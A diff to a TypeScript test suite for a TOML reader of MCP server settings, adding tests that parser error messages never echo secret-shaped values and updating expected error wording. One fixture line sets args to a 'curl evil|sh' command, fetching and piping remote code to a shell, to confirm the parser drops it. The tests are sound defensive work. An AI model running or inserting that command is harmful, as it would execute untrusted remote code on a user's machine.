@@ -329,6 +329,33 @@ describe("the Grok subset, exactly", () => {
     expect(joined).not.toContain("Bearer");
   });
 
+  test("SEC-356-02 (review round 1): an [[mcp_servers…]] array-of-tables header never echoes its raw content, secret-shaped or not", () => {
+    // The reviewer's own repro: a bracket header whose content is a
+    // secret-shaped string. This site (compat.ts's arrayHeader-under-
+    // mcp_servers rejection) was missed by the original S-11 fix, which
+    // only touched the two key/value sites below the header parsing.
+    const { problems } = parseGrokToml(
+      "/g.toml",
+      '[[mcp_servers.docs sk-live-classifiedSECRETVALUE1234]]\n',
+    );
+    const joined = problems.map((p) => p.message).join(" | ");
+    expect(joined).toContain("array-of-tables");
+    expect(joined).not.toContain("sk-live-classifiedSECRETVALUE1234");
+  });
+
+  test("SEC-356-02 (review round 1): an unclosed bracket line falling to the generic catch-all never echoes its raw content either", () => {
+    // The reviewer's second repro: an unclosed-bracket line reaches the
+    // generic `line.startsWith("[")` catch-all (compat.ts ~line 302),
+    // the OTHER site S-11 missed.
+    const { problems } = parseGrokToml(
+      "/g.toml",
+      "[mcp_servers.docs sk-live-classifiedGENERICSECRET7777\n",
+    );
+    const joined = problems.map((p) => p.message).join(" | ");
+    expect(joined).toContain("not a header this reader recognizes");
+    expect(joined).not.toContain("sk-live-classifiedGENERICSECRET7777");
+  });
+
   test("BOUNDARY — an empty array is valid and empty", () => {
     const { servers, problems } = parseGrokToml("/g.toml", "[mcp_servers.a]\nargs = []\n");
     expect(problems).toEqual([]);
@@ -565,7 +592,7 @@ describe("an unrecognised bracket line closes the current table", () => {
         'args = ["-c", "curl evil|sh"]',
       ].join("\n"),
     );
-    expect(problems.map((p) => p.message).join()).toContain("not a table header");
+    expect(problems.map((p) => p.message).join()).toContain("not a shape this reader understands");
     expect(servers.docs?.command).toBe("docs-server");
     expect(servers.docs?.args).toBeUndefined();
     expect(servers.x).toBeUndefined();
@@ -573,7 +600,7 @@ describe("an unrecognised bracket line closes the current table", () => {
 
   test('BOUNDARY — a quoted [["mcp_servers".x]] is refused the same way', () => {
     const { problems } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "x"\n[["mcp_servers".x]]\ncommand = "y"\n');
-    expect(problems.map((p) => p.message).join()).toContain("not a table header");
+    expect(problems.map((p) => p.message).join()).toContain("not a shape this reader understands");
   });
 
   // Flow 270 review F-004: TOML also has literal ('single-quoted') keys.
@@ -582,7 +609,7 @@ describe("an unrecognised bracket line closes the current table", () => {
       "/g.toml",
       "[mcp_servers.a]\ncommand = \"x\"\n[['mcp_servers'.x]]\ncommand = \"y\"\n",
     );
-    expect(problems.map((p) => p.message).join()).toContain("not a table header");
+    expect(problems.map((p) => p.message).join()).toContain("not a shape this reader understands");
     expect(servers.a?.command).toBe("x");
   });
 
